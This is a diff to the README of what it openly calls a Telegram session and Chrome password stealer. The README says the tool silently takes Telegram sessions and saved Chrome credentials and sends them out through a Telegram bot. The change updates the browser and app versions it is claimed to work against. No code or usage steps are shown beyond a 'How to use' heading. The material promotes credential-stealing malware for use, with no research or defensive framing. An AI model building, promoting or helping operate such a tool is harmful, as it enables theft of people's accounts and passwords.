@@ -1,6 +1,6 @@
 # telegram session + chrome passwords stealer
 Steals telegram session(without any notifications) and google chrome credentials. Sending via telegram bot.
-Definitely works in 2020 with Chrome Version 81.0.4044.138(the newest on the uploading date: 16.05.2020).
+Definitely works in 2020 with Chrome Version 84.0.4147.105 (Official Build)(the newest on the uploading date: 08.08.2020) and Telegram version 2.2.0.0.
 
 How to use:
 
